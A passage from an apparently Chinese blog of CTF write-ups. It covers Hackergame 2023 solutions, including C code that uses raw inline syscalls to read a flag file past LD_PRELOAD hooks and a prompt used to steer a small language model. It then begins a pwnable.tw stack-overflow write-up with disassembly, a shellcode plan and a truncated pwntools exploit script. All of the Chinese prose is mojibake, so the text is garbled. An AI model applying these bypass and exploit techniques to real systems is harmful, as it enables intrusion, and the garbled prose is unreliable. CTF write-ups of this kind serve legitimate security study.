<h2 id="ğŸª-æµå¼æ˜Ÿçƒ"><a href="#ğŸª-æµå¼æ˜Ÿçƒ" class="headerlink" title="ğŸª æµå¼æ˜Ÿçƒ"></a>ğŸª æµå¼æ˜Ÿçƒ</h2><p>è¿™é“é¢˜çš„éš¾ç‚¹æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯ä¸çŸ¥é“å®½é«˜ï¼ŒåŸå§‹å®½é«˜ä¸æ˜¯10çš„å€æ•°ï¼Œä»¥åŠæœ‰ä¸ªéšæœºæ•°åˆ‡ç‰‡ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°è´¨å› æ•°åˆ†è§£ï¼Œç„¶åçˆ†ç ´ä¸€ç™¾æ¬¡ï¼ŒæŠŠæ‰€æœ‰å¯èƒ½éƒ½è¯•ä¸€éï¼Œä½†æ˜¯ç»“æœéƒ½ä¸å¤ªè¡Œï¼Œæ‰‹å·¥è¯•äº†ä¸€ä¸‹ï¼Œæ‰¾å‡ºä¸‰ä¸ªèƒ½çœ‹å‡ºè§„æ•´å›¾å½¢çš„å°ºå¯¸ï¼Œ640 * 620 1280 * 768 2560 * 1440ï¼Œèƒ½çœ‹åˆ°è§„æ•´å›¾å½¢äº†ï¼Œå‘ç°æ˜¯bang dream itâ€™s mygoçš„è§†é¢‘ï¼Œflagåœ¨å­—å¹•çš„ä½ç½®ï¼Œç¬¬äºŒä¸ªéš¾ç‚¹æ˜¯flagæ¯å¸§éƒ½æœ‰éšæœºä¸€è¡Œè¢«æ··æ·†ï¼Œç„¶åå­—ä½“çš„åŸå› flagçœ‹ä¸å¤ªæ¸…æ¥šï¼Œæœ€åæŠŠç›¸ä¼¼çš„æ•°å­—æšä¸¾äº†äº†ä¸€éï¼Œæ‰æ‹¿åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def restore_video(input_file, output_folder, frame_width, frame_height):</span><br><span class="line"></span><br><span class="line">    with open(input_file, &quot;rb&quot;) as f:</span><br><span class="line">        buffer = np.fromfile(f, dtype=np.uint8)</span><br><span class="line"></span><br><span class="line">    if len(buffer) % 3 != 0:</span><br><span class="line">        buffer = buffer[:-(len(buffer) % 3)]</span><br><span class="line"></span><br><span class="line">    missing_pixels = (frame_width * frame_height * 3) - (len(buffer) % (frame_width * frame_height * 3))</span><br><span class="line">    buffer = np.concatenate([buffer, np.zeros(missing_pixels, dtype=np.uint8)])</span><br><span class="line"></span><br><span class="line">    frame_count = len(buffer) // (frame_width * frame_height * 3)</span><br><span class="line">    buffer = buffer.reshape((frame_count, frame_height, frame_width, 3))</span><br><span class="line"></span><br><span class="line">    if not os.path.exists(output_folder):</span><br><span class="line">        os.makedirs(output_folder)</span><br><span class="line"></span><br><span class="line">    for i in range(frame_count):</span><br><span class="line">        frame = buffer[i].astype(np.uint8)</span><br><span class="line">        filename = os.path.join(output_folder, f&quot;frame_&#123;i:04d&#125;.png&quot;)</span><br><span class="line">        cv2.imwrite(filename, frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    restore_video(&quot;video.bin&quot;, &quot;output_frames&quot;, 640, 620)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;it-could-be-easy-to-restore-video-with-haruhikage-even-without-metadata-0F7968CC&#125;</span><br></pre></td></tr></table></figure>





<h2 id="ğŸª-å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ"><a href="#ğŸª-å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ" class="headerlink" title="ğŸª å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ"></a>ğŸª å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ</h2><p>you are smart</p>
<p>qaqè¿™ä¸ªæ¨¡å‹å¤ªç¬¨äº†ï¼Œè¯•äº†å¥½å¤šå¥å­æ‰è¯•å‡ºæ¥äº†</p>
<img src="/2023/12/28/hackergame2023/1699000096270.png" class="">



<h2 id="ä¸ºä»€ä¹ˆè¦æ‰“å¼€-flag-ğŸ˜¡-å·®ä¸€ä¸ª"><a href="#ä¸ºä»€ä¹ˆè¦æ‰“å¼€-flag-ğŸ˜¡-å·®ä¸€ä¸ª" class="headerlink" title="ä¸ºä»€ä¹ˆè¦æ‰“å¼€ &#x2F;flag ğŸ˜¡[å·®ä¸€ä¸ª]"></a>ä¸ºä»€ä¹ˆè¦æ‰“å¼€ &#x2F;flag ğŸ˜¡[å·®ä¸€ä¸ª]</h2><p>å¥½è€¶ï¼Œåœ¨hackergameä¸Šç¬¬ä¸€ä¸ªbinaryé¢˜</p>
<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>å»æœç´¢äº†ä¸€ä¸‹ä»€ä¹ˆæ˜¯ld_preloadï¼Œld_preloadæ˜¯linuxä¸Šçš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œç¨‹åºè¿è¡Œçš„æ—¶å€™æ ¹æ®ld_preloadé€‰æ‹©ä½¿ç”¨ä»€ä¹ˆåŠ¨æ€é“¾æ¥åº“</p>
<p>è¿™é‡Œä½¿ç”¨äº†&#x2F;stage1.so è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">STAGE = os.environ[<span class="string">&quot;STAGE&quot;</span>]</span><br><span class="line"><span class="keyword">assert</span> STAGE <span class="keyword">in</span> (<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    binary = <span class="built_in">input</span>(<span class="string">&quot;Base64 of binary: &quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/dev/shm/executable&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(base64.b64decode(binary))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/dev/shm/executable&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">if</span> f.read(<span class="number">4</span>) != <span class="string">b&quot;\x7fELF&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ä¸æ˜¯ ELF æ–‡ä»¶&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">    os.chmod(<span class="string">&quot;/dev/shm/executable&quot;</span>, <span class="number">0o555</span>)</span><br><span class="line">    <span class="keyword">if</span> STAGE == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">        output = subprocess.run(</span><br><span class="line">            [<span class="string">&quot;/dev/shm/executable&quot;</span>],</span><br><span class="line">            stdin=subprocess.DEVNULL,</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.PIPE,</span><br><span class="line">            user=<span class="string">&quot;nobody&quot;</span>,</span><br><span class="line">            group=<span class="string">&quot;nogroup&quot;</span>,</span><br><span class="line">            env=&#123;</span><br><span class="line">                <span class="string">&quot;LD_PRELOAD&quot;</span>: <span class="string">&quot;/stage1.so&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br></pre></td></tr></table></figure>

<p>å¤§æ¦‚çœ‹äº†ä¸€éstage1.soï¼Œå‘ç°å’Œioç›¸å…³çš„æ“ä½œå’Œioä¸ç›¸å…³ä½†æ˜¯èƒ½é—´æ¥è¯»flagçš„å‡½æ•°éƒ½è¢«hookäº†ï¼Œè¦ä¹ˆæ˜¯returnä¸€ä¸ªfake flagè¦ä¹ˆæ˜¯ return 0ï¼Œæƒ³äº†å„ç§çš„æ–¹æ³•ï¼Œåé¢çªç„¶è”æƒ³åˆ°è¿™äº›ioçš„æ“ä½œæœ¬è´¨ä¸Šä¸å°±æ˜¯ç³»ç»Ÿè°ƒç”¨å—ï¼Œé‚£æˆ‘ç”¨å†…è”æ±‡ç¼–ï¼Œå»syscallï¼Œæ¨¡æ‹Ÿè¿™äº›è¯»çš„æ“ä½œä¸å°±å¥½äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;syscall&quot;</span></span><br><span class="line">        : <span class="string">&quot;=a&quot;</span> (fd)</span><br><span class="line">        : <span class="string">&quot;0&quot;</span>(SYS_open), <span class="string">&quot;D&quot;</span>(<span class="string">&quot;./flag&quot;</span>), <span class="string">&quot;S&quot;</span>(O_RDONLY)</span><br><span class="line">        : <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;r11&quot;</span>, <span class="string">&quot;memory&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨è¯»å–æ–‡ä»¶å†…å®¹</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;syscall&quot;</span></span><br><span class="line">        : <span class="string">&quot;=a&quot;</span> (nread)</span><br><span class="line">        : <span class="string">&quot;0&quot;</span>(SYS_read), <span class="string">&quot;D&quot;</span>(fd), <span class="string">&quot;S&quot;</span>(buf), <span class="string">&quot;d&quot;</span>(<span class="keyword">sizeof</span>(buf))</span><br><span class="line">        : <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;r11&quot;</span>, <span class="string">&quot;memory&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nread == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">&quot;syscall&quot;</span></span><br><span class="line">            :</span><br><span class="line">        : <span class="string">&quot;a&quot;</span>(SYS_close), <span class="string">&quot;D&quot;</span>(fd)</span><br><span class="line">            : <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;r11&quot;</span>, <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å‡ºæ–‡ä»¶å†…å®¹</span></span><br><span class="line">    fwrite(buf, <span class="number">1</span>, nread, <span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨å…³é—­æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;syscall&quot;</span></span><br><span class="line">        :</span><br><span class="line">    : <span class="string">&quot;a&quot;</span>(SYS_close), <span class="string">&quot;D&quot;</span>(fd)</span><br><span class="line">        : <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;r11&quot;</span>, <span class="string">&quot;memory&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;nande_ld_preload_yattano_a46091dfa1&#125;</span><br></pre></td></tr></table></figure>



<h2 id="æƒœå­—å¦‚é‡‘"><a href="#æƒœå­—å¦‚é‡‘" class="headerlink" title="æƒœå­—å¦‚é‡‘"></a>æƒœå­—å¦‚é‡‘</h2><p>å’±æ˜¯ç”¨æšä¸¾çš„æ–¹æ³•ï¼Œæšä¸¾ä¸€é</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from itertools import product</span><br><span class="line"></span><br><span class="line"># Constants</span><br><span class="line">ROW1 = &quot;nymeh1niwemflcir&#125;echaet&quot;</span><br><span class="line">ROW2 = &quot;a3g7&#125;kidgojernoetlsup?h&quot;</span><br><span class="line">ROW3 = &quot;ulw!f5soadrhwnrsnstnoeq&quot;</span><br><span class="line">ROW4 = &quot;ct&#123;l-findiehaai&#123;oveatas&quot;</span><br><span class="line">ROW5 = &quot;ty9kxborszstguyd?!blm-p&quot;</span><br><span class="line">VOWEL = &#123;&#x27;a&#x27;, &#x27;e&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;u&#x27;&#125;</span><br><span class="line">CONSONANT = &#123;&#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;!&#x27;, &#x27;?&#x27;, &#x27;-&#x27;, &#x27;&#123;&#x27;, &#x27;&#125;&#x27;&#125;</span><br><span class="line">TABLE = [53, 41, 85, 109, 75, 1, 33, 48, 77, 90, 17, 118, 36, 25, 13, 89, 90, 3, 63, 25, 31, 77, 27, 60, 3, 118, 24, 62, 54, 61, 25, 63, 77, 36, 5, 32, 60, 67, 113, 28]</span><br><span class="line"></span><br><span class="line">def add_variance(ori_str):</span><br><span class="line">    variances = set()</span><br><span class="line">    for i, c in enumerate(ori_str):</span><br><span class="line">        if c in CONSONANT:</span><br><span class="line">            variances.add(ori_str[:i+1] + &#x27;e&#x27; + ori_str[i+1:])</span><br><span class="line">            variances.add(ori_str[:i+1] + c + ori_str[i+1:])</span><br><span class="line">    return list(variances)</span><br><span class="line"></span><br><span class="line">def rev_get_str(str):</span><br><span class="line">    return &#x27;&#x27;.join(str[TABLE[i] % len(str)] for i in range(len(TABLE)))</span><br><span class="line"></span><br><span class="line">def is_format(str):</span><br><span class="line">    return str.startswith(&quot;flag&#123;&quot;) and str.endswith(&#x27;&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">rows_variances = [add_variance(ROW1), add_variance(ROW2), add_variance(ROW3), add_variance(ROW4), add_variance(ROW5)]</span><br><span class="line"></span><br><span class="line">count = 0</span><br><span class="line">answers = set()</span><br><span class="line">for variances in product(*rows_variances):</span><br><span class="line">    s = &#x27;&#x27;.join(variances)</span><br><span class="line">    rev = rev_get_str(s)</span><br><span class="line">    if is_format(rev) and rev not in answers:</span><br><span class="line">        answers.add(rev)</span><br><span class="line">        print(rev)</span><br><span class="line">        count += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(count)</span><br></pre></td></tr></table></figure>

</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-12-28</span><span class="leancloud_visitors"></span><span>About 3228 words, 10 min 45 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/12/28/pwnable-tw/">pwnable.tw</a></h3></div><div class="post-content"><div class="card"><p><h1 id="pwnable-tw"><a href="#pwnable-tw" class="headerlink" title="pwnable.tw"></a>pwnable.tw</h1><p>æŒç»­æ›´æ–°</p>
<h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><p>æ£€æŸ¥ä¸€ä¸‹ä¿æŠ¤ å’ŒæŸ¥çœ‹æ¯ä¸ªæ®µçš„æƒé™å‘ç°ï¼Œæ ˆä¸Šæœ‰å¯æ‰§è¡Œæƒé™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lhj@lhj-virtual-machine:~/Desktop/pwntw/start$ checksec start</span><br><span class="line">[*] &#x27;/home/lhj/Desktop/pwntw/start/start&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  vmmap</span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start      End        Offset     Perm Path</span><br><span class="line">0x08048000 0x08049000 0x00000000 r-x /home/lhj/Desktop/pwntw/start/start</span><br><span class="line">0xf7ff8000 0xf7ffc000 0x00000000 r-- [vvar]</span><br><span class="line">0xf7ffc000 0xf7ffe000 0x00000000 r-x [vdso]</span><br><span class="line">0xfffdd000 0xffffe000 0x00000000 rwx [stack]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹äº†ä¸‹é¢˜ç›®é€»è¾‘ï¼Œæœ‰ä¸€ä¸ªè¾“å‡ºä¸€ä¸ªè¾“å…¥ï¼Œæ‰§è¡Œå®Œè¾“å…¥åï¼Œadd 0x14ä½¿å¾—espåˆ° 0x804809d(exit)ï¼Œç„¶åretæ‰§è¡Œ (exit)ç»“æŸç¨‹åºã€‚å¯ä»¥å‘ç°è¾“å…¥å¤§å°æ˜¯0x3cï¼Œæ˜¯èƒ½è¦†ç›–è¿”å›åœ°å€çš„ã€‚å¦‚æœèƒ½æŠŠæ ˆçš„åœ°å€æ³„éœ²å‡ºæ¥çš„è¯ï¼Œå°±èƒ½å¾€æ ˆä¸Šå†™shellcodeï¼Œç„¶åretåˆ°shellcodeé‚£</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function _start:</span><br><span class="line">   0x08048060 &lt;+0&gt;:     push   esp</span><br><span class="line">   0x08048061 &lt;+1&gt;:     push   0x804809d</span><br><span class="line">   0x08048066 &lt;+6&gt;:     xor    eax,eax</span><br><span class="line">   0x08048068 &lt;+8&gt;:     xor    ebx,ebx</span><br><span class="line">   0x0804806a &lt;+10&gt;:    xor    ecx,ecx</span><br><span class="line">   0x0804806c &lt;+12&gt;:    xor    edx,edx</span><br><span class="line">   0x0804806e &lt;+14&gt;:    push   0x3a465443</span><br><span class="line">   0x08048073 &lt;+19&gt;:    push   0x20656874</span><br><span class="line">   0x08048078 &lt;+24&gt;:    push   0x20747261</span><br><span class="line">   0x0804807d &lt;+29&gt;:    push   0x74732073</span><br><span class="line">   0x08048082 &lt;+34&gt;:    push   0x2774654c</span><br><span class="line">   0x08048087 &lt;+39&gt;:    mov    ecx,esp</span><br><span class="line">   0x08048089 &lt;+41&gt;:    mov    dl,0x14</span><br><span class="line">   0x0804808b &lt;+43&gt;:    mov    bl,0x1</span><br><span class="line">   0x0804808d &lt;+45&gt;:    mov    al,0x4</span><br><span class="line">   0x0804808f &lt;+47&gt;:    int    0x80</span><br><span class="line">   0x08048091 &lt;+49&gt;:    xor    ebx,ebx</span><br><span class="line">   0x08048093 &lt;+51&gt;:    mov    dl,0x3c</span><br><span class="line">   0x08048095 &lt;+53&gt;:    mov    al,0x3</span><br><span class="line">   0x08048097 &lt;+55&gt;:    int    0x80</span><br><span class="line">   0x08048099 &lt;+57&gt;:    add    esp,0x14</span><br><span class="line">=&gt; 0x0804809c &lt;+60&gt;:    ret</span><br></pre></td></tr></table></figure>

<p>ä¼šå‘ç°æ‰§è¡Œåˆ°retçš„æ—¶å€™ stackä¸Šæœ‰ä¸€ä¸ªæ ˆç›¸å…³çš„åœ°å€ï¼Œå¯ä»¥é€šè¿‡æ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€è°ƒç”¨ writeæ¥æŠŠespæ‰“å°å‡ºæ¥æ³„éœ²è¿™ä¸ªåœ°å€ï¼Œæ³„éœ²å®Œååˆšåˆšå¥½åˆèƒ½å†readä¸€æ¬¡ï¼Œç¬¬äºŒæ¬¡readå°±å†™shellcodeï¼Œç„¶åæŠŠè¿”å›åœ°å€ä¿®æ”¹æˆshellcodeçš„èµ·å§‹åœ°å€(ç”¨æ³„éœ²å‡ºæ¥çš„åœ°å€ï¼Œgdbå»æŸ¥çœ‹è¿™ä¸ªåœ°å€å’Œshellcodeçš„åç§»æ¥ç®—shellcodeçš„åœ°å€)ï¼Œç¬¬äºŒæ¬¡read espåˆ°è¿”å›åœ°å€ä¹‹é—´çš„è·ç¦»å¤ªçŸ­äº†ï¼Œæ‰€ä»¥åœ¨è¿”å›åœ°å€åè¾¹å†™shellcodeã€‚shellcodeçš„åœ°å€ &#x3D; leak_addr + 0x14(espè·ç¦»è¿”å›åœ°å€çš„åç§»)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x08048087 &lt;+39&gt;:    mov    ecx,esp</span><br><span class="line">0x08048089 &lt;+41&gt;:    mov    dl,0x14</span><br><span class="line">0x0804808b &lt;+43&gt;:    mov    bl,0x1</span><br><span class="line">0x0804808d &lt;+45&gt;:    mov    al,0x4</span><br><span class="line">0x0804808f &lt;+47&gt;:    int    0x80</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./start&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;chall.pwnable.tw&quot;</span></span><br><span class="line">    port = <span class="number">10000</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span 